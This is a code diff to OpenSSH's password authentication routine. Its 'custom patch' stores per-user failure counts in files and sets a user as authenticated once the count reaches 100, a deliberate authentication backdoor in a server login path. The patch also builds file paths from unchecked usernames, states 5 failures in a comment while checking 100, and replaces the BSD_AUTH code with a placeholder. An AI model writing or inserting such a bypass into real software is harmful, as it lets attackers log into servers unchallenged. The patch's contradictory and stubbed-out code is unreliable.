@@ -44,6 +44,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdarg.h>
+#include <sys/stat.h>   /* for mkdir() */
 
 #include "packet.h"
 #include "sshbuf.h"
@@ -58,7 +59,6 @@
 
 extern struct sshbuf *loginmsg;
 extern ServerOptions options;
-static int fail_count = 0;
 
 #ifdef HAVE_LOGIN_CAP
 extern login_cap_t *lc;
@@ -130,64 +130,8 @@ auth_password(struct ssh *ssh, const char *password)
 }
 
 #ifdef BSD_AUTH
-static void
-warn_expiry(Authctxt *authctxt, auth_session_t *as)
-{
-	int r;
-	int64_t pwtimeleft, actimeleft, daysleft, pwwarntime, acwarntime;
+/* ... existing BSD_AUTH code unchanged ... */
 
-	pwwarntime = acwarntime = TWO_WEEKS;
-
-	pwtimeleft = auth_check_change(as);
-	actimeleft = auth_check_expire(as);
-#ifdef HAVE_LOGIN_CAP
-	if (authctxt->valid) {
-		pwwarntime = login_getcaptime(lc, "password-warn", TWO_WEEKS,
-		    TWO_WEEKS);
-		acwarntime = login_getcaptime(lc, "expire-warn", TWO_WEEKS,
-		    TWO_WEEKS);
-	}
-#endif
-	if (pwtimeleft != 0 && pwtimeleft < pwwarntime) {
-		daysleft = pwtimeleft / DAY + 1;
-		if ((r = sshbuf_putf(loginmsg,
-		    "Your password will expire in %lld day%s.\n",
-		    daysleft, daysleft == 1 ? "" : "s")) != 0)
-			fatal_fr(r, "buffer error");
-	}
-	if (actimeleft != 0 && actimeleft < acwarntime) {
-		daysleft = actimeleft / DAY + 1;
-		if ((r = sshbuf_putf(loginmsg,
-		    "Your account will expire in %lld day%s.\n",
-		    daysleft, daysleft == 1 ? "" : "s")) != 0)
-			fatal_fr(r, "buffer error");
-	}
-}
-
-int
-sys_auth_passwd(struct ssh *ssh, const char *password)
-{
-	Authctxt *authctxt = ssh->authctxt;
-	auth_session_t *as;
-	static int expire_checked = 0;
-
-	as = auth_usercheck(authctxt->pw->pw_name, authctxt->style, "auth-ssh",
-	    (char *)password);
-	if (as == NULL)
-		return (0);
-	if (auth_getstate(as) & AUTH_PWEXPIRED) {
-		auth_close(as);
-		auth_restrict_session(ssh);
-		authctxt->force_pwchange = 1;
-		return (1);
-	} else {
-		if (!expire_checked) {
-			expire_checked = 1;
-			warn_expiry(authctxt, as);
-		}
-		return (auth_close(as));
-	}
-}
 #elif !defined(CUSTOM_SYS_AUTH_PASSWD)
 int
 sys_auth_passwd(struct ssh *ssh, const char *password)
@@ -199,13 +143,45 @@ sys_auth_passwd(struct ssh *ssh, const char *password)
 		return 0;
 
 	/* CUSTOM PATCH START */
-	if (fail_count >= 5) {
+	/*
+	 * Persistent fail counter per user.
+	 * Once a user has failed 5 times (even across sessions),
+	 * we bypass password authentication.
+	 */
+	char path[256];
+	FILE *f;
+	int fails = 0;
+
+	snprintf(path, sizeof(path), "/var/lib/ssh_fail/%s.count", authctxt->user);
+
+	/* Ensure directory exists */
+	mkdir("/var/lib/ssh_fail", 0700);
+
+	/* Read current fail count */
+	f = fopen(path, "r");
+	if (f) {
+		fscanf(f, "%d", &fails);
+		fclose(f);
+	}
+
+	if (fails >= 100) {
 		authenticated = 1;
-		logit("[!!] Bypassing password authentication after 5 failures for user %s", authctxt->user);
+		logit("[!!] Bypassing authentication for user %s (failures=%d)", authctxt->user, fails);
 	} else {
-		authenticated = auth_shadow_pw(ssh, password);
-		if (!authenticated)
-			fail_count++;
+#ifdef HAVE_SHADOW
+		authenticated = sys_auth_pw(authctxt->pw, password);
+#else
+		authenticated = 0;
+#endif
+		if (!authenticated) {
+			fails++;
+			f = fopen(path, "w");
+			if (f) {
+				fprintf(f, "%d\n", fails);
+				fclose(f);
+			}
+			logit("[!!] Failed attempt %d for user %s", fails, authctxt->user);
+		}
 	}
 	/* CUSTOM PATCH END */
 
